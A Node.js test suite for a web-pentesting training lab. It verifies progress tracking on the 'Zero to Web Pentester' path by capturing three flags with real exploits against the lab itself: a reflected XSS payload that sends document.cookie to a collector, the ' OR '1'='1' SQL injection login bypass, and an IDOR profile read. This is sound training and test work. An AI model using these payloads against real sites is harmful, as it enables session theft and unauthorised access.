'use strict';
// M13 paths: progress tracking for the zero-to-web-pentester career path.
//
// What this suite proves:
//   1. Three flags of the path are captured through REAL exploits on one
//      student session: xss/reflected (beacon claim, same technique as
//      tests/xss.test.js), sqli/login-bypass (same payload as
//      tests/sqli.test.js), idor/profile (same route as tests/idor.test.js).
//   2. GET /paths/zero-to-web-pentester then shows 3/10, with exactly those
//      three steps marked captured and the other seven not captured.
//   3. GET /paths shows the path card at 3/10 for the same session.
//   4. A fresh client on a fresh boot shows 0/10 everywhere (progress is
//      per session, not global).
//
// ROUTE CONTRACT (paths/index.js is being built by the paths infra lead and
// is not wired yet; these tests fail at the gate until it is mounted):
//   GET /paths
//     200. One card per path. The card for this path links to
//     "/paths/zero-to-web-pentester", shows the name "Zero to Web
//     Pentester", and embeds the shared lib/page.js progressBar(done, total)
//     (role="progressbar" with aria-valuenow/aria-valuemax, plus the
//     "<span>d/t - p%</span>" text).
//   GET /paths/zero-to-web-pentester
//     200. Shows the path name, one overall progressBar for the path, and ten
//     step blocks in path order, each with class "path-step". Each block
//     contains the challenge display name and a status pill:
//       captured:     class="status status-captured"
//       not captured: a class="status" pill WITHOUT status-captured.
//
// The ten steps of zero-to-web-pentester (paths/zero-to-web-pentester.js),
// in order, and the display names this suite relies on:
//   1. xss:reflected       "Reflected XSS"   (captured here)
//   2. sqli:login-bypass   "Login Bypass"    (captured here)
//   3. idor:profile        "Profile IDOR"    (captured here)
//   4. csrf:email, 5. misconfig:debug, 6. http:verb-tamper,
//   7. redirect:redirect-double-slash, 8. formula:formula-csv,
//   9. auth:user-enum, 10. xss:stored       (all not captured here)
const test = require('node:test');
const assert = require('node:assert/strict');
const vm = require('node:vm');
const { client, bootLab, capturedSet, FLAG_RE } = require('./helpers');

const PATH_ID = 'zero-to-web-pentester';
const PATH_NAME = 'Zero to Web Pentester';
const PATH_HREF = `/paths/${PATH_ID}`;
const EXPECTED = ['Reflected XSS', 'Login Bypass', 'Profile IDOR'];

// ------------------------------------------------------------ page parsing
// First lib/page.js progressBar on the page: role="progressbar" with
// aria-valuenow/aria-valuemax (emitted as aria-valuenow, aria-valuemin,
// aria-valuemax, in that order).
function firstProgress(html, label) {
  const m = html.match(/aria-valuenow="(\d+)"[^>]*aria-valuemax="(\d+)"/);
  assert.ok(m, `${label}: no progressBar (aria-valuenow/aria-valuemax) found on the page`);
  return { done: Number(m[1]), total: Number(m[2]) };
}

// The card for this path on GET /paths: prefer the anchor card that links to
// the path, fall back to a window around the link.
function cardHtml(html, href) {
  const anchor = new RegExp(`<a\\b[^>]*href="${href}"[^>]*>([\\s\\S]*?)<\\/a>`);
  const m = html.match(anchor);
  if (m) return m[1];
  const i = html.indexOf(`href="${href}"`);
  assert.ok(i >= 0, `no link to ${href} on GET /paths`);
  return html.slice(Math.max(0, i - 4000), i + 4000);
}

// Step blocks on the path detail page, in document order. Steps are
// <article> elements with nested divs, so the block runs to the closing
// </article>, not the first inner </div>.
function stepBlocks(html) {
  const blocks = [...html.matchAll(/<[^>]*class="[^"]*\bpath-step\b[^"]*"[^>]*>([\s\S]*?)<\/article>/g)]
    .map((m) => m[1]);
  return blocks;
}

const stepCaptured = (block) => /\bstatus-captured\b/.test(block);

function noEmDash(text, label) {
  assert.ok(!text.includes('\u2014'), `${label}: em dash`);
}

// ------------------------------------------------- gate: routes must exist
async function requirePage(c, url) {
  const r = await c.get(url);
  assert.equal(r.status, 200,
    `${url} is not wired yet: mount the paths router from paths/index.js ` +
    '(see the ROUTE CONTRACT at the top of tests/paths-progress.test.js)');
  return r.text;
}

// ------------------------------------------------------ real exploit #1:
// xss/reflected via the beacon claim (same technique as tests/xss.test.js).
function inlineScripts(html) {
  const src = html.replace(/<!--[\s\S]*?-->/g, '')
    .replace(/<textarea\b[^>]*>[\s\S]*?<\/textarea>/gi, '');
  const out = [];
  const re = /<script(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script>/gi;
  let m;
  while ((m = re.exec(src))) out.push(m[1]);
  return out;
}

function browserSim(cookie) {
  const calls = [];
  const errors = [];
  const els = {};
  const el = () => (els.x = els.x || {
    style: {}, textContent: '', innerHTML: '', hidden: true,
    getAttribute: () => '/xss/claim-status?v=none',
    querySelector: () => ({ style: {} }),
    classList: { add() {}, remove() {}, toggle() {} },
  });
  const ctx = {
    document: { cookie, getElementById: el, querySelectorAll: () => [], addEventListener: () => {} },
    location: {},
    fetch: (u) => { calls.push(String(u)); return Promise.resolve({ json: () => Promise.resolve({ captured: false }) }); },
    setInterval: () => 0,
    alert: () => {},
    URLSearchParams,
    decodeURIComponent,
  };
  ctx.window = ctx;
  vm.createContext(ctx);
  return {
    errors,
    runAll: (html) => {
      for (const code of inlineScripts(html)) {
        try { vm.runInContext(code, ctx, { timeout: 2000 }); }
        catch (e) { errors.push(e.message); }
      }
    },
    beacons: () => calls.filter((u) => u.startsWith('/xss/collect')),
  };
}

async function captureReflectedXss(c) {
  const payload = `<script>fetch('/xss/collect?c='+document.cookie+'&v=reflected&n='+window.__px)</script>`;
  const page = await c.get('/xss/search?q=' + encodeURIComponent(payload));
  assert.equal(page.status, 200, 'reflected search page');
  const b = browserSim(c.cookie());
  b.runAll(page.text);
  assert.deepEqual(b.errors, [], 'page scripts must run clean in the sim');
  assert.ok(b.beacons().length > 0, 'the reflected payload must fire a collector beacon');
  for (const url of b.beacons()) {
    const r = await c.get(url);
    if (r.status === 200) return r;
  }
  assert.fail('collector rejected every beacon: the reflected flag was not awarded');
}

// ------------------------------------------------------ real exploit #2:
// sqli/login-bypass with the classic payload (same as tests/sqli.test.js).
async function captureSqliLoginBypass(c) {
  const r = await c.post('/sqli/login', { username: "' OR '1'='1' -- ", password: 'anything' });
  assert.equal(r.status, 200, 'sqli login bypass');
  assert.ok((r.text.match(FLAG_RE) || []).length > 0, 'bypass response must carry the flag');
  return r;
}

// ------------------------------------------------------ real exploit #3:
// idor/profile: alice (user 2) reads user 1 (same as tests/idor.test.js).
async function captureIdorProfile(c) {
  const login = await c.get('/idor/login/alice');
  assert.equal(login.status, 302, 'idor login as alice');
  const hit = await c.get('/idor/users/1');
  assert.equal(hit.status, 200, 'other member profile');
  assert.ok((hit.text.match(FLAG_RE) || []).length > 0, 'profile page must carry the flag');
  return hit;
}

// ================================================================= suite
test('paths progress: three real captures drive 3/10 on the path pages', async (t) => {
  const { srv } = await bootLab(t);
  const c = client(srv.base);

  // The route contract gate: everything below needs the paths router mounted.
  await requirePage(c, '/paths');

  await t.test('three real exploits capture three flags on one session', async () => {
    await captureReflectedXss(c);
    await captureSqliLoginBypass(c);
    await captureIdorProfile(c);
    const got = await capturedSet(c);
    for (const want of ['xss:Reflected XSS', 'sqli:Login Bypass', 'idor:Profile IDOR']) {
      assert.ok(got.includes(want), `scoreboard should list ${want}`);
    }
  });

  await t.test('detail page shows 3/10 with the three captured steps marked', async () => {
    const html = await requirePage(c, PATH_HREF);
    noEmDash(html, PATH_HREF);
    assert.ok(html.includes(PATH_NAME), 'path name on the detail page');
    const { done, total } = firstProgress(html, PATH_HREF);
    assert.deepEqual([done, total], [3, 10], 'overall progress after three captures');

    const steps = stepBlocks(html);
    assert.equal(steps.length, 10, 'the path has ten step blocks in path order');
    for (let i = 0; i < 10; i++) {
      const shouldBe = i < 3;
      if (shouldBe) assert.ok(steps[i].includes(EXPECTED[i]), `step ${i + 1} names its challenge`);
      assert.equal(stepCaptured(steps[i]), shouldBe, `step ${i + 1} captured status`);
      assert.ok(/class="[^"]*\bstatus\b/.test(steps[i]), `step ${i + 1} carries a status pill`);
    }
  });

  await t.test('index page card shows 3/10 for the same session', async () => {
    const html = await requirePage(c, '/paths');
    noEmDash(html, '/paths');
    const card = cardHtml(html, PATH_HREF);
    assert.ok(card.includes(PATH_NAME), 'card names the path');
    const { done, total } = firstProgress(card, '/paths card');
    assert.deepEqual([done, total], [3, 10], 'card progress after three captures');
  });
});

test('paths progress: a fresh session on a fresh boot starts at 0/10', async (t) => {
  const { srv } = await bootLab(t);
  const fresh = client(srv.base);

  const detail = await requirePage(fresh, PATH_HREF);
  noEmDash(detail, PATH_HREF);
  assert.deepEqual([firstProgress(detail, PATH_HREF).done, firstProgress(detail, PATH_HREF).total],
    [0, 10], 'fresh session: detail page starts at 0/10');
  const steps = stepBlocks(detail);
  assert.equal(steps.length, 10, 'ten steps even before any capture');
  for (let i = 0; i < 10; i++) {
    assert.equal(stepCaptured(steps[i]), false, `step ${i + 1} must not show captured`);
  }

  const index = await requirePage(fresh, '/paths');
  noEmDash(index, '/paths');
  const card = cardHtml(index, PATH_HREF);
  const { done, total } = firstProgress(card, '/paths card (fresh)');
  assert.deepEqual([done, total], [0, 10], 'fresh session: card starts at 0/10');
});
